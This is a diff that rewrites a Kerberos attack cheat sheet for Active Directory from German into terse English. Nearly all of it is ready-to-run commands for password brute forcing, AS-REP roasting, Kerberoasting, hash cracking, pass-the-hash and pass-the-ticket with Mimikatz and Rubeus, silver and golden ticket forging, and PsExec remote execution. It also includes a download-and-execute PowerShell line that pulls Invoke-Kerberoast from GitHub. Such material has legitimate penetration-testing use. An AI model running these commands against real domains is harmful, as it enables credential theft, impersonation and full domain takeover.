@@ -1,263 +1,138 @@
----
-description: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
----
+# exploit kerberos authentication with ticket attacks. example: asrep roasting, kerberoasting, golden tickets
 
-# Kerberos
-
-### **Brute-Force-Angriffe**
-
-Mit [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):
-
+## brute force authentication
 ```bash
-python kerbrute.py -domain <domänenname> -users <benutzerdatei> -passwords <passwortdatei> -outputfile <ausgabedatei>
+# kerbrute username enumeration
+python kerbrute.py -domain corp.com -users users.txt -passwords pass.txt -outputfile results.txt
+
+# rubeus brute force
+.\Rubeus.exe brute /users:users.txt /passwords:pass.txt /domain:corp.com /outfile:results.txt
+.\Rubeus.exe brute /passwords:pass.txt /outfile:results.txt
 ```
 
-Mit [Rubeus](https://github.com/Zer1t0/Rubeus) (Brute-Modul):
-
+## asreproasting (no preauth required)
 ```bash
-# Mit einer Liste von Benutzern
-.\Rubeus.exe brute /users:<benutzerdatei> /passwords:<passwortdatei> /domain:<domänenname> /outfile:<ausgabedatei>
+# impacket - all domain users (need creds)
+python GetNPUsers.py corp.com/user:pass -request -format hashcat -outputfile asrep.hashes
 
-# Überprüft Passwörter für alle Benutzer der aktuellen Domäne
-.\Rubeus.exe brute /passwords:<passwortdatei> /outfile:<ausgabedatei>
+# impacket - user list (no creds needed)
+python GetNPUsers.py corp.com/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
+
+# rubeus asreproast
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
+
+# crack hashes
+hashcat -m 18200 -a 0 asrep.hashes rockyou.txt
+john --wordlist=rockyou.txt asrep.hashes
 ```
 
-***
-
-### **ASREPRoasting**
-
-Ein Angriff, bei dem ein Angreifer Benutzerkonten ohne Pre-Authentication nutzt. Er fordert ein AS-REP (Authentication Service Reply) vom Domain Controller an und erhält ein Ticket, das offline mit Brute-Force-Methoden geknackt werden kann, um das Passwort des Benutzers zu ermitteln.
-
-Mit [Impacket](https://github.com/SecureAuthCorp/impacket) – GetNPUsers.py:
-
+## kerberoasting (service accounts)
 ```bash
-# Für alle Domänenbenutzer (Anmeldedaten erforderlich)
-python GetNPUsers.py <domäne>/<benutzer>:<passwort> -request -format <[hashcat | john]> -outputfile <ausgabedatei>
+# impacket get service tickets
+python GetUserSPNs.py corp.com/user:pass -outputfile tgs.hashes
 
-# Mit Benutzerliste (ohne Anmeldedaten)
-python GetNPUsers.py <domäne>/ -usersfile <benutzerdatei> -format <[hashcat | john]> -outputfile <ausgabedatei>
-```
+# rubeus kerberoast
+.\Rubeus.exe kerberoast /outfile:tgs.hashes
 
-Mit [Rubeus](https://github.com/GhostPack/Rubeus):
-
-```bash
-.\Rubeus.exe asreproast /format:<[hashcat | john]> /outfile:<ausgabedatei>
-```
-
-Hash-Cracking:
-
-```bash
-hashcat -m 18200 -a 0 <asrep_hashes> <passwortliste>
-john --wordlist=<passwortliste> <asrep_hashes>
-```
-
-***
-
-### **Kerberoasting**
-
-Ein Angriff, bei dem ein Angreifer Service-Tickets (TGS) für Kerberos-geschützte Dienste anfordert. Die Tickets werden offline bruteforciert, um schwache Passwörter von Servicekonten zu erlangen – ohne verdächtige Netzwerkaktivität.
-
-Mit \[Impacket] – GetUserSPNs.py:
-
-```bash
-python GetUserSPNs.py <domäne>/<benutzer>:<passwort> -outputfile <ausgabedatei>
-```
-
-Mit [Rubeus](https://github.com/GhostPack/Rubeus):
-
-```bash
-.\Rubeus.exe kerberoast /outfile:<ausgabedatei>
-```
-
-Mit **PowerShell**:
-
-```powershell
+# powershell method
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
-Invoke-Kerberoast -OutputFormat <[hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <ausgabedatei>
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hashes
+
+# crack service tickets
+hashcat -m 13100 --force tgs.hashes rockyou.txt
+john --format=krb5tgs --wordlist=rockyou.txt tgs.hashes
 ```
 
-Hash-Cracking:
-
+## overpass-the-hash / pass-the-key
 ```bash
-hashcat -m 13100 --force <tgs_hashes> <passwortliste>
-john --format=krb5tgs --wordlist=<passwortliste> <tgs_hashes>
+# impacket - get tgt with ntlm hash
+python getTGT.py corp.com/user -hashes :ntlm_hash
+
+# impacket - get tgt with aes key
+python getTGT.py corp.com/user -aesKey aes_key
+
+# impacket - use ticket for remote exec
+export KRB5CCNAME=user.ccache
+python psexec.py corp.com/user@target.corp.com -k -no-pass
+python smbexec.py corp.com/user@target.corp.com -k -no-pass
+python wmiexec.py corp.com/user@target.corp.com -k -no-pass
+
+# rubeus + psexec
+.\Rubeus.exe asktgt /domain:corp.com /user:admin /rc4:ntlm_hash /ptt
+.\PsExec.exe -accepteula \\target.corp.com cmd
 ```
 
-***
-
-### **Overpass-The-Hash / Pass-The-Key (PTK)**
-
-Ein Angriff, bei dem ein NTLM-Hash (anstelle des Klartextpassworts) verwendet wird, um ein Kerberos Ticket Granting Ticket (TGT) über eine `kerberos::ptt`-ähnliche Technik zu generieren. Damit kann sich der Angreifer authentifizieren, ohne jemals das tatsächliche Passwort zu kennen.
-
-Mit \[Impacket]:
-
+## pass-the-ticket attacks
 ```bash
-# Ticket (TGT) mit Hash anfordern
-python getTGT.py <domäne>/<benutzer> -hashes [lm_hash]:<ntlm_hash>
-
-# Mit AES-Schlüssel
-python getTGT.py <domäne>/<benutzer> -aesKey <aes_key>
-
-# Mit Passwort (wird bei Bedarf abgefragt)
-python getTGT.py <domäne>/<benutzer>:<passwort>
-
-# Ticket verfügbar machen
-export KRB5CCNAME=<ticket_datei>
-
-# Remote-Befehle ausführen
-python psexec.py <domäne>/<benutzer>@<host> -k -no-pass
-python smbexec.py <domäne>/<benutzer>@<host> -k -no-pass
-python wmiexec.py <domäne>/<benutzer>@<host> -k -no-pass
-```
-
-Mit \[Rubeus] + \[PsExec]:
-
-```bash
-.\Rubeus.exe asktgt /domain:<domäne> /user:<benutzer> /rc4:<ntlm_hash> /ptt
-.\PsExec.exe -accepteula \\<host> cmd
-```
-
-***
-
-### **Pass-The-Ticket (PTT)**
-
-Ein Angriff, bei dem ein gültiges Kerberos-Ticket (TGT oder TGS) direkt in den Speicher eines Prozesses injiziert wird. Dadurch kann sich der Angreifer als der Ticketinhaber ausgeben, ohne dessen Anmeldedaten zu kennen.
-
-#### Tickets unter Linux sammeln
-
-Prüfen:
-
-```bash
+# collect tickets linux
 grep default_ccache_name /etc/krb5.conf
-```
+# if KEYRING, use tickey
+cp tickey /tmp/tickey && /tmp/tickey -i
 
-Falls _KEYRING_, nutze \[tickey]:
-
-```bash
-cp tickey /tmp/tickey
-/tmp/tickey -i
-```
-
-#### Tickets unter Windows sammeln
-
-Mit **Mimikatz**:
-
-```bash
+# collect tickets windows - mimikatz
 sekurlsa::tickets /export
-```
 
-Mit **Rubeus**:
-
-```powershell
+# collect tickets windows - rubeus
 .\Rubeus.exe dump
-[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64_ticket>"))
-```
+[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("base64_ticket"))
 
-**Format konvertieren** (\[ticket\_converter.py]):
-
-```bash
+# convert ticket formats
 python ticket_converter.py ticket.kirbi ticket.ccache
 python ticket_converter.py ticket.ccache ticket.kirbi
+
+# use ticket linux
+export KRB5CCNAME=ticket.ccache
+python psexec.py corp.com/user@target -k -no-pass
+
+# use ticket windows - mimikatz
+kerberos::ptt ticket.kirbi
+
+# use ticket windows - rubeus
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+.\PsExec.exe -accepteula \\target cmd
 ```
 
-#### Ticket unter Linux verwenden
-
+## silver ticket (fake service ticket)
 ```bash
-export KRB5CCNAME=<ticket_datei>
-python psexec.py <domäne>/<benutzer>@<host> -k -no-pass
+# impacket silver ticket
+python ticketer.py -nthash service_ntlm -domain-sid domain_sid -domain corp.com -spn cifs/target.corp.com user
+export KRB5CCNAME=user.ccache
+python psexec.py corp.com/user@target.corp.com -k -no-pass
+
+# mimikatz silver ticket
+kerberos::golden /domain:corp.com /sid:domain_sid /rc4:service_ntlm /user:admin /service:cifs /target:target.corp.com
 ```
 
-#### Ticket unter Windows verwenden
-
-**Mimikatz**:
-
+## golden ticket (fake tgt) [!]
 ```bash
-kerberos::ptt <ticket.kirbi>
+# impacket golden ticket - need krbtgt hash
+python ticketer.py -nthash krbtgt_ntlm -domain-sid domain_sid -domain corp.com admin
+
+# mimikatz golden ticket
+kerberos::golden /domain:corp.com /sid:domain_sid /aes256:krbtgt_aes /user:admin
 ```
 
-**Rubeus**:
-
+## utility commands
 ```bash
-.\Rubeus.exe ptt /ticket:<ticket.kirbi>
+# generate ntlm from password
+python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "password".encode("utf-16le")).digest()).decode())'
+
+# get domain sid
+python getPac.py -targetUser admin corp.com/user:pass
+
+# list spns
+python GetUserSPNs.py corp.com/user:pass
 ```
 
-**Befehl ausführen (z. B. PsExec)**:
-
+## common spns to target
 ```bash
-.\PsExec.exe -accepteula \\<host> cmd
+# high value service accounts
+MSSQLSvc/*
+HTTP/*
+TERMSERV/*
+WSMAN/*
+SPN/FIMService
+SPN/FIMSynchronizationService
 ```
 
-***
-
-### **Silver Ticket**
-
-Ein **Silver Ticket** ist ein gefälschtes **Service Ticket (TGS)**, das lokal erstellt wird, um Zugriff auf einen bestimmten Kerberos-geschützten Dienst zu erhalten. Es erfordert nur den Hash des Dienstkontos (z. B. eines SQL- oder Webdienstes), nicht den KRBTGT-Key.
-
-Mit \[Impacket]:
-
-```bash
-python ticketer.py -nthash <ntlm_hash> -domain-sid <domänen_sid> -domain <domäne> -spn <dienst_spn> <benutzer>
-python ticketer.py -aesKey <aes_key> ...
-export KRB5CCNAME=<ticket_datei>
-python psexec.py ...
-```
-
-Mit **Mimikatz**:
-
-```bash
-kerberos::golden /domain:<domäne>/sid:<sid> /rc4:<ntlm_hash> /user:<benutzer> /service:<dienst> /target:<zielhost>
-```
-
-***
-
-### **Golden Ticket**
-
-Ein **Gold Ticket** ist ein gefälschtes **Ticket Granting Ticket (TGT)** in Kerberos, das mit dem geheimen **KRBTGT-Schlüssel** erstellt wurde. Damit kann sich ein Angreifer gegenüber jedem Dienst im Active Directory als beliebiger Benutzer (z. B. Domain-Admin) ausgeben. Voraussetzung: Zugriff auf den KRBTGT-Key.
-
-Mit \[Impacket]:
-
-```bash
-python ticketer.py -nthash <krbtgt_ntlm> -domain-sid <sid> -domain <domäne> <benutzer>
-```
-
-Mit **Mimikatz**:
-
-```bash
-kerberos::golden /domain:<domäne>/sid:<sid> /aes256:<aes_key> /user:<benutzer>
-```
-
-Dann Ticket wie oben injizieren (Rubeus, Mimikatz) und ausführen (z. B. PsExec).
-
-***
-
-### **Sonstiges**
-
-NTLM aus Passwort erzeugen:
-
-```python
-python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<passwort>".encode("utf-16le")).digest())'
-```
-
-***
-
-<details>
-
-<summary>Tools</summary>
-
-[Impacket](https://github.com/SecureAuthCorp/impacket)
-
-[Mimikatz](https://github.com/gentilkiwi/mimikatz)
-
-[Rubeus](https://github.com/GhostPack/Rubeus)
-
-[Rubeus (mit Brute-Modul)](https://github.com/Zer1t0/Rubeus)
-
-[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
-
-[kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
-
-[tickey](https://github.com/TarlogicSecurity/tickey)
-
-[ticket\_converter.py](https://github.com/Zer1t0/ticket_converter)
-
-</details>
+# TODO: add constrained delegation attacks, s4u2self/s4u2proxy, dcsync techniques
